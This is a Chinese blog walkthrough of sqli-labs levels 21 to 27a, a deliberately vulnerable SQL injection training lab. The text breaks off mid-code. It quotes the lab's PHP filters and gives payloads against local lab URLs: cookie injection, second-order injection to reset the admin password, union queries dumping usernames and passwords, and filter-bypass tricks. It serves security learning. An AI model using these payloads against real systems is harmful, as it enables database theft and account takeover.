<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.2.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"blank-admure.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="sqli-labs 21~65关通关教程">
<meta property="og:type" content="article">
<meta property="og:title" content="sqli-labs 21~65关通关教程">
<meta property="og:url" content="https://blank-admure.github.io/2020/10/20/sqli-labs%20Less%2021-65%20%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/index.html">
<meta property="og:site_name" content="blank">
<meta property="og:description" content="sqli-labs 21~65关通关教程">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20201027154019248.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzU2OTcx,size_16,color_FFFFFF,t_70#pic_center">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20201027154126738.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzU2OTcx,size_16,color_FFFFFF,t_70#pic_center">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20201027154308177.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzU2OTcx,size_16,color_FFFFFF,t_70#pic_center">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20201027154357225.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzU2OTcx,size_16,color_FFFFFF,t_70#pic_center">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20201027154817307.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzU2OTcx,size_16,color_FFFFFF,t_70#pic_center">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20201027154854412.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzU2OTcx,size_16,color_FFFFFF,t_70#pic_center">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20201027155728802.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzU2OTcx,size_16,color_FFFFFF,t_70#pic_center">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20201027160108297.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzU2OTcx,size_16,color_FFFFFF,t_70#pic_center">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20201027160947348.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzU2OTcx,size_16,color_FFFFFF,t_70#pic_center">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20201027161239116.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzU2OTcx,size_16,color_FFFFFF,t_70#pic_center">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20201027162705744.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzU2OTcx,size_16,color_FFFFFF,t_70#pic_center">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20201027163010967.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzU2OTcx,size_16,color_FFFFFF,t_70#pic_center">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20201027163102514.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzU2OTcx,size_16,color_FFFFFF,t_70#pic_center">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20201027163311478.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzU2OTcx,size_16,color_FFFFFF,t_70#pic_center">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20201027163936834.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzU2OTcx,size_16,color_FFFFFF,t_70#pic_center">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20201027164055617.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzU2OTcx,size_16,color_FFFFFF,t_70#pic_center">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20201027164104632.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzU2OTcx,size_16,color_FFFFFF,t_70#pic_center">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20201027164116300.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzU2OTcx,size_16,color_FFFFFF,t_70#pic_center">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20201027164538390.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzU2OTcx,size_16,color_FFFFFF,t_70#pic_center">
<meta property="article:published_time" content="2020-10-20T03:55:20.000Z">
<meta property="article:modified_time" content="2020-10-27T08:52:00.858Z">
<meta property="article:author" content="blank-admure">
<meta property="article:tag" content="sqli-labs">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20201027154019248.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzU2OTcx,size_16,color_FFFFFF,t_70#pic_center">

<link rel="canonical" href="https://blank-admure.github.io/2020/10/20/sqli-labs%20Less%2021-65%20%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>sqli-labs 21~65关通关教程 | blank</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">blank</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://blank-admure.github.io/2020/10/20/sqli-labs%20Less%2021-65%20%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="blank-admure">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="blank">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          sqli-labs 21~65关通关教程
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2020-10-20 11:55:20" itemprop="dateCreated datePublished" datetime="2020-10-20T11:55:20+08:00">2020-10-20</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-10-27 16:52:00" itemprop="dateModified" datetime="2020-10-27T16:52:00+08:00">2020-10-27</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/sqli-labs/" itemprop="url" rel="index"><span itemprop="name">sqli-labs</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">阅读次数：</span>
              <span id="busuanzi_value_page_pv"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="fa fa-comment-o"></i>
      </span>
      <span class="post-meta-item-text">Valine：</span>
    
    <a title="valine" href="/2020/10/20/sqli-labs%20Less%2021-65%20%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2020/10/20/sqli-labs%20Less%2021-65%20%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/" itemprop="commentCount"></span>
    </a>
  </span>
  
  
            <div class="post-description">sqli-labs 21~65关通关教程</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h2 id="第二十一关："><a href="#第二十一关：" class="headerlink" title="第二十一关："></a>第二十一关：</h2><p>cookie注入</p>
<p>YOUR COOKIE : uname = RHVtYg== and expires: Sat 16 Jul 2016 - 08:32:26<br>注： RHVtYg== 是 Dumb 经Base64加密后的值</p>
<p>和上关又是差不多 base64编码而已</p>
<p>payload: </p>
<blockquote>
<p> ‘) or 1=1 #<br>Jykgb3IgMT0xICM=</p>
</blockquote>
<h2 id="第二十二关："><a href="#第二十二关：" class="headerlink" title="第二十二关："></a>第二十二关：</h2><p>闭合为双引号   参考21关.</p>
<h2 id="第二十三关："><a href="#第二十三关：" class="headerlink" title="第二十三关："></a>第二十三关：</h2><p>过滤了注释符号 而已</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$reg</span> = <span class="string">&quot;/#/&quot;</span>;</span><br><span class="line"><span class="variable">$reg1</span> = <span class="string">&quot;/--/&quot;</span>;</span><br><span class="line"><span class="variable">$replace</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$id</span> = preg_replace(<span class="variable">$reg</span>, <span class="variable">$replace</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span> = preg_replace(<span class="variable">$reg1</span>, <span class="variable">$replace</span>, <span class="variable">$id</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="variable">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>payload:</p>
<blockquote>
<p>qing’ union select 1,group_concat(username),group_concat(password) from users where 1 or ‘1’ = ‘</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20201027154019248.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzU2OTcx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h2 id="二十四关："><a href="#二十四关：" class="headerlink" title="二十四关："></a>二十四关：</h2><p>最简单的二次注入 没任何过滤    </p>
<p>login.php：</p>
<p>发现输入进行了mysql_real_escape_string()函数转义 编码如果不是gbk宽字节注入  单引号是不能用了。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">sqllogin</span></span>()&#123;</span><br><span class="line"></span><br><span class="line">   <span class="variable">$username</span> = mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line">   <span class="variable">$password</span> = mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&quot;login_password&quot;</span>]);</span><br><span class="line">   <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="variable">$username</span>&#x27; and password=&#x27;<span class="variable">$password</span>&#x27;&quot;</span>;</span><br><span class="line">//<span class="variable">$sql</span> = <span class="string">&quot;SELECT COUNT(*) FROM users WHERE username=&#x27;<span class="variable">$username</span>&#x27; and password=&#x27;<span class="variable">$password</span>&#x27;&quot;</span>;</span><br><span class="line">   <span class="variable">$res</span> = mysql_query(<span class="variable">$sql</span>) or die(<span class="string">&#x27;You tried to be real smart, Try harder!!!! :( &#x27;</span>);</span><br><span class="line">   <span class="variable">$row</span> = mysql_fetch_row(<span class="variable">$res</span>);</span><br><span class="line">    //print_r(<span class="variable">$row</span>) ;</span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$row</span>[1]) &#123;</span><br><span class="line">            <span class="built_in">return</span> <span class="variable">$row</span>[1];</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="built_in">return</span> 0;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20201027154126738.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzU2OTcx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>login_create.php：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//$username=  $_POST[&#x27;username&#x27;] ;</span></span><br><span class="line">    $username=  mysql_escape_string($_POST[<span class="string">&#x27;username&#x27;</span>]) ;</span><br><span class="line">    $pass= mysql_escape_string($_POST[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">    $re_pass= mysql_escape_string($_POST[<span class="string">&#x27;re_password&#x27;</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;font size=&#x27;3&#x27; color=&#x27;#FFFF00&#x27;&gt;&quot;</span>;</span><br><span class="line">    $sql = <span class="string">&quot;select count(*) from users where username=&#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">    $res = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;You tried to be smart, Try harder!!!! :( &#x27;</span>);</span><br><span class="line">      $row = mysql_fetch_row($res);</span><br><span class="line">      </span><br></pre></td></tr></table></figure>

<p>这里看到这里把username再次取出来查询的没有任何过滤 所以我们在插入username的就直接把注入的payload插到数据库里，取出来时候造成注入</p>
<blockquote>
<p>admin’ or 1=1#</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20201027154308177.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzU2OTcx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">登录了admin’ or 1=1#这个账号 输入新密码qing</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Validating the user input........</span></span><br><span class="line">    $username= $_SESSION[<span class="string">&quot;username&quot;</span>];</span><br><span class="line">    $curr_pass= mysql_real_escape_string($_POST[<span class="string">&#x27;current_password&#x27;</span>]);</span><br><span class="line">    $pass= mysql_real_escape_string($_POST[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">    $re_pass= mysql_real_escape_string($_POST[<span class="string">&#x27;re_password&#x27;</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>($pass==$re_pass)</span><br><span class="line">    &#123;    </span><br><span class="line">        $sql = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27; &quot;</span>;</span><br><span class="line">        $res = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;You tried to be smart, Try harder!!!! :( &#x27;</span>);</span><br><span class="line">        $row = mysql_affected_rows();</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20201027154357225.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzU2OTcx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>update的时候就把我们原先的admin’ or 1=1 #取出来拿到语句中了  所以密码都是qing了</p>
<h2 id="第二十五关"><a href="#第二十五关" class="headerlink" title="第二十五关:"></a>第二十五关:</h2><p>这关开始过滤 </p>
<blockquote>
<p>function blacklist($id){<br>    $id= preg_replace(‘/or/i’,””, $id);<br>    $id= preg_replace(‘/AND/i’,””, $id);<br>    return $id;<br>}<br>$id= blacklist($id);<br>$hint=$id;<br>$sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”;</p>
</blockquote>
<p>记得双写<br>payload:</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1/Less-25/?id=1&#39;">http://127.0.0.1/Less-25/?id=1&#39;</a> oorr ‘1’=’1<br><a target="_blank" rel="noopener" href="http://127.0.0.1/Less-25/?id=qing&#39;">http://127.0.0.1/Less-25/?id=qing&#39;</a> union select 1,group_concat(table_name),3 from infoorrmation_schema.tables where table_schema=’security’ –+</p>
</blockquote>
<h2 id="25a："><a href="#25a：" class="headerlink" title="25a："></a>25a：</h2><p>和25一样 没单引号而已</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1/Less-25a/?id=-1">http://127.0.0.1/Less-25a/?id=-1</a> union select 1,group_concat(table_name),3 from infoorrmation_schema.tables where table_schema=’security’ –+</p>
</blockquote>
<h2 id="第二十六关："><a href="#第二十六关：" class="headerlink" title="第二十六关："></a>第二十六关：</h2><p>这关过滤多一些 好耍一点</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params">$id</span>) </span>&#123;</span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);            <span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/and/i&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//strip out /*</span></span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out --</span></span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);            <span class="comment">//Strip out #</span></span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/[\s]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out spaces</span></span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out slashes</span></span><br><span class="line">    <span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br><span class="line">$id= blacklist($id);</span><br><span class="line">$hint=$id;</span><br><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>单引号闭合 过滤了 or，and ， /* , – , # , 空格 , /<img src="https://img-blog.csdnimg.cn/20201027154817307.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzU2OTcx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">payload：</p>
<blockquote>
<p>qing’%A0union%A0select%A01,group_concat(username),group_concat(passwoorrd)%A0from%A0security%2Eusers%A0where%A01%A0%26%26%a0’1</p>
</blockquote>
<p>%A0替代空格 &amp;&amp;替换and 注意url编码 需要linux 不测试了<br><img src="https://img-blog.csdnimg.cn/20201027154854412.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzU2OTcx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h2 id="26a："><a href="#26a：" class="headerlink" title="26a："></a>26a：</h2><p>多一个闭合括号 不多说</p>
<h2 id="第二十七关："><a href="#第二十七关：" class="headerlink" title="第二十七关："></a>第二十七关：</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params">$id</span>)</span>&#123;</span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);       <span class="comment">//strip out /*</span></span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);          <span class="comment">//Strip out --.</span></span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);           <span class="comment">//Strip out #.</span></span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);         <span class="comment">//Strip out spaces.</span></span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/select/m&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);   <span class="comment">//Strip out spaces.</span></span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);         <span class="comment">//Strip out spaces.</span></span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);    <span class="comment">//Strip out union</span></span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);    <span class="comment">//Strip out select</span></span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/UNION/s&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);  <span class="comment">//Strip out UNION</span></span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/SELECT/s&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);   <span class="comment">//Strip out SELECT</span></span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/Union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);     <span class="comment">//Strip out Union</span></span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/Select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);     <span class="comment">//Strip out select</span></span><br><span class="line">    <span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>多一些过滤 关键字大小写就行了</p>
<p>payload：</p>
<blockquote>
<p>0’%A0UnIoN%A0SeLeCt(1),group_concat(username),group_concat(password)%A0from%A0security%2Eusers%A0where%A01%26%26%a0’1</p>
</blockquote>
<h2 id="27a："><a href="#27a：" class="headerlink" title="27a："></a>27a：</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params">$id</span>)</span>&#123;</span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//strip out /*</span></span><br><span class="line">    $id= 